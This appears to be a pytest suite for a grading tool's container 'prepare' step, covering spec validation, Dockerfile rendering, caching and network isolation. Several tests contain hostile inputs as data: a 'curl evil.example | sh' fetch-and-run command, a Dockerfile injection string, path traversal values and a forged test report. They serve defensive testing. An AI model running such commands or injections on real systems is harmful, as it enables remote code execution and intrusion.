import json
import os
import subprocess
import sys
import textwrap
import time

import pytest

from markbook import grader, prepare
from markbook.sandbox import SandboxUnavailable
from markbook.spec import SpecError, load_spec

BASE = """
name: prep
sandbox: {image: "python:3.12-slim"}
%s
criteria:
  - {id: c, points: 1, check: {type: command, run: "true"}}
"""


def write_spec(tmp_path, prepare_yaml="", files=None, body=BASE):
    for rel, content in (files or {}).items():
        (tmp_path / rel).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / rel).write_text(content)
    p = tmp_path / "spec.yaml"
    p.write_text(textwrap.dedent(body % prepare_yaml))
    return p


# ── spec rules ────────────────────────────────────────────────────────────────

def test_valid_prepare(tmp_path):
    p = write_spec(tmp_path, "prepare: {files: [requirements.txt], run: ['pip install -r requirements.txt'], timeout: 90}",
                   {"requirements.txt": "pytest\n"})
    s = load_spec(p)
    assert s.prepare.run == ("pip install -r requirements.txt",) and s.prepare.files == ("requirements.txt",)
    assert s.prepare.timeout == 90


def test_run_can_be_a_single_string(tmp_path):
    assert load_spec(write_spec(tmp_path, "prepare: {run: 'pip install pytest'}")).prepare.run == ("pip install pytest",)


@pytest.mark.parametrize("prep,files,needle", [
    ("prepare: {files: [r.txt]}", {"r.txt": "x"}, "prepare.run"),
    ("prepare: {run: []}", {}, "prepare.run"),
    ("prepare: {run: ['x'], bogus: 1}", {}, "unknown option"),
    ("prepare: {run: ['x'], files: ['../r.txt']}", {}, "relative path inside"),
    ("prepare: {run: ['x'], files: ['/etc/passwd']}", {}, "relative path inside"),
    ("prepare: {run: ['x'], files: [missing.txt]}", {}, "not a regular file"),
    ("prepare: {run: ['x'], timeout: 0}", {}, "prepare.timeout"),
    ("prepare: [1, 2]", {}, "must be a mapping"),
])
def test_prepare_validation_errors(tmp_path, prep, files, needle):
    with pytest.raises(SpecError, match=needle):
        load_spec(write_spec(tmp_path, prep, files))


def test_symlinked_and_oversized_prepare_files_refused(tmp_path):
    (tmp_path / "real.txt").write_text("x")
    os.symlink(tmp_path / "real.txt", tmp_path / "link.txt")
    with pytest.raises(SpecError, match="not a regular file"):
        load_spec(write_spec(tmp_path, "prepare: {run: ['x'], files: [link.txt]}"))
    (tmp_path / "big.txt").write_text("x" * (2 << 20))
    with pytest.raises(SpecError, match="larger than"):
        load_spec(write_spec(tmp_path, "prepare: {run: ['x'], files: [big.txt]}"))


def test_prepare_refused_in_uploaded_specs(tmp_path):
    p = write_spec(tmp_path, "prepare: {run: ['curl evil.example | sh']}")
    assert load_spec(p).prepare is not None                       # trusted CLI use
    with pytest.raises(SpecError, match="not allowed in uploaded specs"):
        load_spec(p, confine=True)


def test_prepare_without_code_criteria_is_an_error(tmp_path):
    p = tmp_path / "s.yaml"
    p.write_text("name: x\nsandbox: {image: python:3}\nprepare: {run: ['x']}\n"
                 "criteria:\n  - {id: r, points: 1, check: {type: readme}}\n")
    with pytest.raises(SpecError, match="has no effect"):
        load_spec(p)


@pytest.mark.parametrize("image", ["python:3\nRUN curl evil", "bad image", "-v", "a;b", ""])
def test_invalid_image_references_rejected(tmp_path, image):
    p = tmp_path / "s.yaml"
    p.write_text(f"name: x\nsandbox: {{image: {json.dumps(image)}}}\n"
                 "criteria:\n  - {id: c, points: 1, check: {type: command, run: 'true'}}\n")
    with pytest.raises(SpecError):
        load_spec(p)


# ── Dockerfile and cache key ──────────────────────────────────────────────────

def test_dockerfile_commands_cannot_inject_instructions():
    nasty = 'echo hi\nRUN curl http://evil | sh\n" && $(id) `x`'
    df = prepare.render_dockerfile("python:3.12-slim", (nasty, "pip install x"), True, "k" * 64)
    lines = df.splitlines()
    runs = [l for l in lines if l.startswith("RUN ")]
    assert len(runs) == 2, "a newline inside a command must not create a second Dockerfile instruction"
    assert json.loads(runs[0][4:]) == ["sh", "-c", nasty]
    assert lines[0] == "FROM python:3.12-slim" and "COPY files/ /prepare/" in lines
    assert "COPY" not in prepare.render_dockerfile("python:3.12-slim", ("x",), False, "k" * 64)


def test_cache_key_reacts_to_every_input(tmp_path):
    p = write_spec(tmp_path, "prepare: {files: [r.txt], run: ['pip install -r r.txt']}", {"r.txt": "a"})
    s = load_spec(p)
    k = prepare.build_key(s, "sha256:base1")
    assert k == prepare.build_key(s, "sha256:base1"), "stable"
    assert k != prepare.build_key(s, "sha256:base2"), "a changed base image must rebuild"
    (tmp_path / "r.txt").write_text("b")
    assert k != prepare.build_key(s, "sha256:base1"), "changed file content must rebuild"
    (tmp_path / "r.txt").write_text("a")
    s2 = load_spec(write_spec(tmp_path, "prepare: {files: [r.txt], run: ['pip install -r r.txt --no-deps']}"))
    assert k != prepare.build_key(s2, "sha256:base1"), "changed command must rebuild"
    assert prepare.tag_for(k).startswith("markbook-prepared:") and len(prepare.tag_for(k)) == len("markbook-prepared:") + 16


# ── behaviour without a container runtime ─────────────────────────────────────

def test_none_runtime_refuses_prepare_loudly(tmp_path):
    s = load_spec(write_spec(tmp_path, "prepare: {run: ['pip install pytest']}"))
    with pytest.raises(SandboxUnavailable, match="container runtime"):
        prepare.ensure_prepared(s, "none")
    with pytest.raises(SandboxUnavailable, match="container runtime"):
        grader.preflight(s, "none")


def test_no_prepare_is_a_no_op(tmp_path):
    s = load_spec(write_spec(tmp_path))
    assert prepare.ensure_prepared(s, "none") is s and grader.preflight(s, "none") is s


def test_preflight_returns_the_effective_spec_and_build_false_skips_the_build(tmp_path, monkeypatch):
    s = load_spec(write_spec(tmp_path, "prepare: {run: ['pip install pytest']}"))
    monkeypatch.setattr(grader, "docker_status", lambda: (True, "ok"))
    monkeypatch.setattr(grader, "ensure_image", lambda *a, **k: None)
    calls = []

    def fake(spec, runtime, log=None):
        import dataclasses
        calls.append(runtime)
        return dataclasses.replace(spec, sandbox=dataclasses.replace(spec.sandbox, image="markbook-prepared:abc"),
                                   prepared={"tag": "markbook-prepared:abc"})
    monkeypatch.setattr(grader, "ensure_prepared", fake)
    quick = grader.preflight(s, "docker", build=False)
    assert quick is s and calls == [], "the web request path must not run a multi-minute build"
    eff = grader.preflight(s, "docker")
    assert eff.sandbox.image == "markbook-prepared:abc" and calls == ["docker"]
    block = grader.assignment_block(eff, "docker")
    assert block["sandbox"]["image"] == "markbook-prepared:abc" and block["sandbox"]["prepared"]["tag"] == "markbook-prepared:abc"
    assert "prepared" not in grader.assignment_block(s, "docker")["sandbox"]


def test_report_with_a_prepared_image_still_validates_against_the_schema(demo_run, schema):
    import copy
    import jsonschema
    run = copy.deepcopy(demo_run["run"])
    run["assignment"]["sandbox"]["prepared"] = {
        "tag": "markbook-prepared:abc", "key": "abc", "base_image": "python:3.12-slim",
        "commands": ["pip install pytest"], "files": {"requirements.txt": "0" * 64}, "cached": True}
    jsonschema.Draft202012Validator(schema).validate(run)
    run["assignment"]["sandbox"]["prepared"].pop("tag")
    with pytest.raises(jsonschema.ValidationError):
        jsonschema.Draft202012Validator(schema).validate(run)


def test_queue_inside_the_spec_directory_does_not_recurse(tmp_path):
    """Regression: `--queue ./q` next to the spec used to copy the spec dir into itself forever."""
    from markbook.queue import enqueue
    from markbook.roster import Entry
    (tmp_path / ".markbook" / "runs" / "old").mkdir(parents=True)
    (tmp_path / ".markbook" / "runs" / "old" / "run.json").write_text("{}")
    p = write_spec(tmp_path, "prepare: {files: [requirements.txt], run: ['pip install -r requirements.txt']}",
                   {"requirements.txt": "pytest\n"})
    q = enqueue(p, [Entry("a", "A", "", "/x")], tmp_path / "q", "none", run_id="r")
    frozen = q.root / "spec"
    assert (frozen / "requirements.txt").exists() and not (frozen / "q").exists()
    assert not (frozen / ".markbook").exists(), "other runs' data must not be frozen into the queue"


def test_queue_freezes_prepare_files_with_the_spec(tmp_path):
    from markbook.queue import enqueue
    from markbook.roster import Entry
    p = write_spec(tmp_path, "prepare: {files: [requirements.txt], run: ['pip install -r requirements.txt']}",
                   {"requirements.txt": "pytest==8\n"})
    q = enqueue(p, [Entry("a", "A", "", "/x")], tmp_path.parent / (tmp_path.name + "-q"), "none", run_id="r")
    assert (q.root / "spec" / "requirements.txt").read_text() == "pytest==8\n"
    assert q.load_spec().prepare.files == ("requirements.txt",)


# ── web: uploads may not use prepare; saved specs may, and fail visibly without a runtime ──

def test_web_upload_with_prepare_is_rejected_and_preset_builds_in_the_thread(tmp_path):
    from markbook.web.app import create_app
    specs = tmp_path / "specs"
    specs.mkdir()
    write_spec(specs, "prepare: {run: ['pip install pytest']}")
    (specs / "good.yaml").write_text((specs / "spec.yaml").read_text())
    (specs / "spec.yaml").unlink()
    app = create_app(tmp_path / "runs", runtime="none", specs_dir=specs)
    c = app.test_client()
    hdr = {"Origin": "http://localhost"}
    up = c.post("/runs/new", data={"spec_text": (specs / "good.yaml").read_text(),
                                   "roster_text": "id,repo\na,https://github.com/o/r"}, headers=hdr)
    assert up.status_code == 400 and "not allowed in uploaded specs" in up.get_data(as_text=True)
    r = c.post("/runs/new", data={"preset": "good.yaml", "roster_text": "id,repo\na,https://github.com/o/r"}, headers=hdr)
    assert r.status_code == 302, "a trusted saved spec is accepted; the build happens in the grading thread"
    run_id = r.headers["Location"].rsplit("/", 1)[1]
    for _ in range(100):
        st = c.get(f"/runs/{run_id}/status.json").get_json()
        if st["state"] != "running":
            break
        time.sleep(0.1)
    assert st["state"] == "failed" and "container runtime" in st["error"]


# ── real container runtimes (docker, and podman when usable) ──────────────────

from test_docker_sandbox import IMAGES, PY_IMAGES, _params, _usable  # noqa: E402


@pytest.fixture(params=_params(_usable))
def rt(request):
    return request.param


def _cleanup(rt, tag):
    subprocess.run([rt, "rmi", "-f", tag], capture_output=True)


@pytest.mark.docker
def test_prepared_image_is_built_once_cached_and_students_still_have_no_network(rt, tmp_path):
    from markbook.roster import Entry
    from conftest import make_repo
    # Offline-safe: the "dependency" is a file the build step creates; no PyPI needed.
    p = write_spec(tmp_path, "prepare: {files: [marker.txt], run: ['cp /prepare/marker.txt /prepared.txt']}",
                   {"marker.txt": f"built-{time.time_ns()}\n"}, body=BASE.replace(
                       "criteria:\n  - {id: c, points: 1, check: {type: command, run: \"true\"}}",
                       "criteria:\n"
                       "  - {id: dep, points: 1, check: {type: command, run: 'cat /prepared.txt', stdout_contains: built-}}\n"
                       "  - {id: net, points: 1, check: {type: command, run: 'wget -T2 -qO- http://1.1.1.1', expect_exit: 1}}"))
    spec = load_spec(p)
    import dataclasses
    spec = dataclasses.replace(spec, sandbox=dataclasses.replace(spec.sandbox, image=IMAGES[rt], timeout=10))
    tag = None
    try:
        eff = prepare.ensure_prepared(spec, rt)
        tag = eff.prepared["tag"]
        assert eff.prepared["cached"] is False and eff.sandbox.image == tag
        again = prepare.ensure_prepared(spec, rt)
        assert again.prepared["cached"] is True and again.prepared["tag"] == tag, "second call must hit the cache"
        repo = make_repo(tmp_path / "stu", {"a.txt": "1"})
        sub, _ = grader.grade_submission(eff, Entry("s", "S", "", str(repo)), rt, allow_local=True)
        crit = {c["id"]: c for c in sub["criteria"]}
        assert crit["dep"]["status"] == "passed", "the prepared dependency is visible to the student's container"
        assert crit["net"]["status"] == "passed", "and the student's container still has no network"
        (tmp_path / "marker.txt").write_text("changed\n")
        assert prepare.ensure_prepared(load_spec(p), rt).prepared["tag"] != tag, "changed input => new image"
    finally:
        if tag:
            _cleanup(rt, tag)
        for t in subprocess.run([rt, "images", "--format", "{{.Repository}}:{{.Tag}}"], capture_output=True,
                                text=True).stdout.split():
            if t.startswith(("markbook-prepared:", "localhost/markbook-prepared:")):
                _cleanup(rt, t)


@pytest.mark.docker
def test_failing_prepare_command_is_reported_and_builds_nothing(rt, tmp_path):
    import dataclasses
    spec = load_spec(write_spec(tmp_path, "prepare: {run: ['echo the-reason-it-broke >&2; exit 7']}"))
    spec = dataclasses.replace(spec, sandbox=dataclasses.replace(spec.sandbox, image=IMAGES[rt]))
    with pytest.raises(SandboxUnavailable, match="no student was graded") as e:
        prepare.ensure_prepared(spec, rt)
    assert "the-reason-it-broke" in str(e.value)


# The headline scenario, with the real package index: pytest installed ONCE with network,
# the student's tests then run with none. Needs internet, so it is opt-in (CI sets the variable).

def _pypi_reachable() -> bool:
    try:
        import urllib.request
        urllib.request.urlopen("https://pypi.org/simple/pytest/", timeout=5)
        return True
    except Exception:
        return False


@pytest.mark.docker
@pytest.mark.skipif(not os.environ.get("MARKBOOK_TEST_NETWORK"), reason="set MARKBOOK_TEST_NETWORK=1 (needs internet)")
def test_pytest_installed_once_then_graded_offline_with_per_test_credit(rt, tmp_path):
    if not _pypi_reachable():
        pytest.skip("PyPI not reachable")
    from markbook.roster import Entry
    from conftest import make_repo
    py = PY_IMAGES[rt]
    p = tmp_path / "spec.yaml"
    (tmp_path / "requirements.txt").write_text("pytest==8.3.4\n")
    p.write_text(textwrap.dedent(f"""
        name: real
        sandbox: {{image: "{py}", timeout: 60, memory: 256m}}
        prepare: {{files: [requirements.txt], run: ["pip install --no-cache-dir -r requirements.txt"]}}
        criteria:
          - id: tests
            points: 6
            check: {{type: junit, run: "python -m pytest -q -p no:cacheprovider --junitxml=report.xml", min_tests: 3}}
    """))
    eff, tag = None, None
    try:
        eff = prepare.ensure_prepared(load_spec(p), rt)
        tag = eff.prepared["tag"]
        repo = make_repo(tmp_path / "stu", {
            "calc.py": "def add(a, b):\n    return a + b\n\ndef sub(a, b):\n    return a + b\n",
            "test_calc.py": ("from calc import add, sub\n\ndef test_a():\n    assert add(1, 2) == 3\n\n"
                             "def test_b():\n    assert add(0, 0) == 0\n\ndef test_c():\n    assert sub(3, 1) == 2\n"),
            "report.xml": "<testsuite><testcase name='a'/><testcase name='b'/><testcase name='c'/></testsuite>",
        })
        sub, _ = grader.grade_submission(eff, Entry("s", "S", "", str(repo)), rt, allow_local=True)
        c = sub["criteria"][0]
        assert c["status"] == "partial" and c["points"] == pytest.approx(4.0), \
            "2 of 3 tests pass; the forged all-pass report.xml in the repo must be ignored"
        assert any("test_c" in e["label"] for e in c["evidence"])
    finally:
        if tag:
            _cleanup(rt, tag)
